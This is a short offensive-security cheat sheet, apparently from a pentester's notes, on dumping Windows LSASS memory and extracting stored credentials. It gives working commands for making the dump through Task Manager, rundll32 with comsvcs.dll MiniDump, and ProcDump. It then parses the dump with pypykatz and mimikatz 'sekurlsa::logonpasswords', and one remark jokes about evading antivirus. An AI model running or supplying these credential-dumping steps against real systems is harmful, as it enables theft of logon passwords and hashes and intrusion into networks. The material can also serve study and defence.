
```sh
ls ass
```

>LSASS stores credentials that have **active logon** sessions. Active logon, active logon, active logon.

# Create `lsass` memdump 
## Task manager

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

![/images/2c12d6d2c99b798493187852aef6f8747d23351cd122d6d3d4dc0b1097cb4dd4.jpeg]({{< relref "/images/2c12d6d2c99b798493187852aef6f8747d23351cd122d6d3d4dc0b1097cb4dd4.jpeg" >}})
## CLI

### Find LSASS's PID

cmd

```cmd
tasklist /svc
```

powershell

```powershell
Get-Process lsass
```

### Create a dump file

>Most AV blocks this. Don't get caught :D

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

## `ProcDump`

We can also use the [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) tool from sysinternals to dump `lsass`'s memory

First we download the tool and transfer it to target machine

```sh
wget https://download.sysinternals.com/files/Procdump.zip
unzip Procdump.zip
```

Then we can create the dump file

```cmd
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

# Extracting

## `pypykatz`

>We use `lsa` in the command because `LSASS` is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file

```sh
pypykatz lsa minidump ./lsass.dmp 
```

## `mimikatz.exe`

```cmd
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```
